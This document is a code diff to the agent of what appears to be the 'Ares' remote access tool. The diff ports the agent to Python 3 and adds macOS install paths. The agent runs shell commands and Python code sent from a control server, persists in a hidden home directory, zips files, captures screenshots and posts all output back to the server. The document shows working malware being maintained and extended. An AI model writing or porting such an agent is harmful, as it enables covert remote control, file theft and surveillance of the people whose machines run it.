@@ -11,12 +11,14 @@ import sys
 import traceback
 import threading
 import uuid
-import StringIO
+from io import StringIO
 import zipfile
 import tempfile
 import socket
 import getpass
 if os.name == 'nt':
+    from PIL import ImageGrab
+elif os.name == 'posix':
     from PIL import ImageGrab
 else:
     import pyscreenshot as ImageGrab
@@ -50,6 +52,8 @@ class Agent(object):
             install_dir = self.expand_path('~/.ares')
         elif platform.system() == 'Windows':
             install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+        elif platform.system() == 'Darwin':
+            install_dir = self.expand_path('~/.ares')
         if os.path.exists(install_dir):
             return install_dir
         else:
@@ -101,8 +105,12 @@ class Agent(object):
         if not output:
             return
         if newlines:
-            output += "\n\n"
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
+            output = str(output) + "\n\n"
+        try:
+            output = str(output, 'UTF-8')
+        except:
+            pass
+        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
         data={'output': output})
 
     def expand_path(self, path):
@@ -116,6 +124,10 @@ class Agent(object):
             proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             out, err = proc.communicate()
             output = (out + err)
+            try:
+                output = str(output, "utf-8")
+            except:
+                pass
             self.send_output(output)
         except Exception as exc:
             self.send_output(traceback.format_exc())
@@ -123,10 +135,10 @@ class Agent(object):
     @threaded
     def python(self, command_or_file):
         """ Runs a python command or a python file and returns the output """
-        new_stdout = StringIO.StringIO()
+        new_stdout = StringIO()
         old_stdout = sys.stdout
         sys.stdout = new_stdout
-        new_stderr = StringIO.StringIO()
+        new_stderr = StringIO()
         old_stderr = sys.stderr
         sys.stderr = new_stderr
         if os.path.exists(command_or_file):
@@ -215,7 +227,7 @@ class Agent(object):
         self.send_output('[+] Agent installed.')
 
     def clean(self):
-        """ Uninstalls the agent """ 
+        """ Uninstalls the agent """
         if platform.system() == 'Linux':
             persist_dir = self.expand_path('~/.ares')
             if os.path.exists(persist_dir):
@@ -259,7 +271,7 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
-   
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
